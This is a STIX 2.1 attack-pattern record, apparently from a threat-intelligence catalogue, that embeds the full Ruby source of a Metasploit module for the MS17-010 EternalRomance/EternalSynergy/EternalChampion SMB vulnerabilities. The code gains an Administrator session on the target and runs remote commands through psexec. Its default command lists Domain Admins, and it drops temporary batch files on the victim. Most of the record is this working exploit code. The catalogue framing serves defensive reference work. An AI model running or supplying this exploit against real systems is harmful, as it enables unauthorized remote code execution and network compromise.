{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f58a9044-97b2-4be8-8a0d-9fe7835b2c09",
    "created": "2024-08-14T16:24:23.759728Z",
    "modified": "2024-08-14T16:24:23.759732Z",
    "name": "MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution",
    "description": " This module will exploit SMB with vulnerabilities in MS17-010 to achieve a write-what-where primitive. This will then be used to overwrite the connection session information with as an Administrator session. From there, the normal psexec command execution is done.  Exploits a type confusion between Transaction and WriteAndX requests and a race condition in Transaction requests, as seen in the EternalRomance, EternalChampion, and EternalSynergy exploits. This exploit chain is more reliable than the EternalBlue exploit, but requires a named pipe.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/smb/ms17_010_command.rb",
            "external_id": "ms17_010_command.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/worawit/MS17-010"
        },
        {
            "source_name": "reference",
            "url": "https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf"
        },
        {
            "source_name": "reference",
            "url": "https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::SMB::Client::Psexec_MS17_010\n  include Msf::Exploit::Remote::SMB::Client::Psexec\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution',\n      'Description'    => %q{\n          This module will exploit SMB with vulnerabilities in MS17-010 to achieve a write-what-where\n          primitive. This will then be used to overwrite the connection session information with as an\n           Administrator session. From there, the normal psexec command execution is done.\n\n          Exploits a type confusion between Transaction and WriteAndX requests and a race condition in\n          Transaction requests, as seen in the EternalRomance, EternalChampion, and EternalSynergy\n          exploits. This exploit chain is more reliable than the EternalBlue exploit, but requires a\n          named pipe.\n      },\n\n      'Author'         => [\n        'sleepya',          # zzz_exploit idea and offsets\n        'zerosum0x0',\n        'Shadow Brokers',\n        'Equation Group'\n      ],\n\n      'License'        => MSF_LICENSE,\n      'References'     => [\n        [ 'MSB', 'MS17-010' ],\n        [ 'CVE', '2017-0143'], # EternalRomance/EternalSynergy - Type confusion between WriteAndX and Transaction requests\n        [ 'CVE', '2017-0146'], # EternalChampion/EternalSynergy - Race condition with Transaction requests\n        [ 'CVE', '2017-0147'], # for EternalRomance reference\n        [ 'URL', 'https://github.com/worawit/MS17-010' ],\n        [ 'URL', 'https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf' ],\n        [ 'URL', 'https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/' ],\n      ],\n      'DisclosureDate' => '2017-03-14',\n      'Notes' =>\n          {\n              'AKA' => [\n                  'ETERNALSYNERGY',\n                  'ETERNALROMANCE',\n                  'ETERNALCHAMPION',\n                  'ETERNALBLUE'      # does not use any CVE from Blue, but Search should show this, it is preferred\n              ]\n          }\n    ))\n\n    register_options([\n      OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),\n      OptString.new('COMMAND', [true, 'The command you want to execute on the remote host', 'net group \"Domain Admins\" /domain']),\n      OptPort.new('RPORT', [true, 'The Target port', 445]),\n      OptString.new('WINPATH', [true, 'The name of the remote Windows directory', 'WINDOWS']),\n    ])\n\n    register_advanced_options([\n      OptString.new('FILEPREFIX', [false, 'Add a custom prefix to the temporary files','']),\n      OptInt.new('DELAY', [true, 'Wait this many seconds before reading output and cleaning up', 0]),\n      OptInt.new('RETRY', [true, 'Retry this many times to check if the process is complete', 0]),\n    ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  def run_host(ip)\n    begin\n      if datastore['SMBUser'].present?\n        print_status(\"Authenticating to #{ip} as user '#{splitname(datastore['SMBUser'])}'...\")\n      end\n      eternal_pwn(ip)         # exploit Admin session\n      smb_pwn(ip)             # psexec\n\n    rescue ::Msf::Exploit::Remote::SMB::Client::Psexec_MS17_010::MS17_010_Error => e\n      print_error(\"#{e.message}\")\n    rescue ::Errno::ECONNRESET,\n           ::Rex::HostUnreachable,\n           ::Rex::Proto::SMB::Exceptions::LoginError,\n           ::Rex::ConnectionTimeout,\n           ::Rex::ConnectionRefused  => e\n      print_error(\"#{e.class}: #{e.message}\")\n    rescue => error\n      print_error(error.class.to_s)\n      print_error(error.message)\n      print_error(error.backtrace.join(\"\\n\"))\n    ensure\n      eternal_cleanup()       # restore session\n    end\n  end\n\n  def smb_pwn(ip)\n    text = \"\\\\#{datastore['WINPATH']}\\\\Temp\\\\#{datastore['FILEPREFIX']}#{Rex::Text.rand_text_alpha(16)}.txt\"\n    bat  = \"\\\\#{datastore['WINPATH']}\\\\Temp\\\\#{datastore['FILEPREFIX']}#{Rex::Text.rand_text_alpha(16)}.bat\"\n    @smbshare = datastore['SMBSHARE']\n    @ip = ip\n\n    # Try and authenticate with given credentials\n    output = execute_command_with_output(text, bat, datastore['COMMAND'], @smbshare, @ip, delay: datastore['DELAY'], retries: datastore['RETRY'])\n\n    # Report output\n    print_good(\"Command completed successfully!\")\n    print_status(\"Output for \\\"#{datastore['COMMAND']}\\\":\\n\")\n    print_line(\"#{output}\\n\")\n    report_note(\n      :rhost => datastore['RHOSTS'],\n      :rport => datastore['RPORT'],\n      :type  => \"psexec_command\",\n      :name => datastore['COMMAND'],\n      :data => output\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-03-14"
}